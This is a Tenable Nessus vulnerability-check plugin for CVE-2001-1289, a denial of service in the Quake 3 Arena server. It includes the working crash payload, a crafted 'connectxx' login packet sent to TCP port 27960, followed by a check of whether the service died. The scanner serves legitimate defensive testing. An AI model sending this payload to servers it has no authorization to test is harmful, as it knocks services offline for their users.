#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CVE
#

include("compat.inc");

if (description)
{
 script_id(10931);
 script_version("$Revision: 1.21 $");
 script_cvs_date("$Date: 2014/05/26 15:47:04 $");

 script_cve_id("CVE-2001-1289");
 script_bugtraq_id(3123);
 script_osvdb_id(9849);

 script_name(english:"Quake 3 Arena Malformed Connection Packet DoS");
 script_summary(english:"Quake3 Arena DOS");

 script_set_attribute(attribute:"synopsis", value:"The remote server is vulnerable to a denial of service.");
 script_set_attribute(attribute:"description", value:
"It was possible to crash the Quake3 Arena daemon by sending a
specially crafted login string.

An attacker may use this attack to make this service crash
continuously, preventing you from playing.");
 script_set_attribute(attribute:"solution", value:"Upgrade your software.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/07/30");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/03/29");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2002-2014 Tenable Network Security, Inc.");

 script_family(english:"Windows");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports(27960);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");

function test_q3_port(port)
{
 local_var s, soc;
 if (! get_port_state(port))
  return(0);

 soc = open_sock_tcp(port);
 if (!soc)
  return(0);
 s = string(raw_string(0xFF, 0xFF, 0xFF, 0xFF), "connectxx");
 send(socket:soc, data:s);
 close(soc);

 if (service_is_dead(port: port) > 0)
  security_warning(port);

 return(1);
}

if (report_paranoia < 2) audit(AUDIT_PARANOID);

test_q3_port(port:27960);
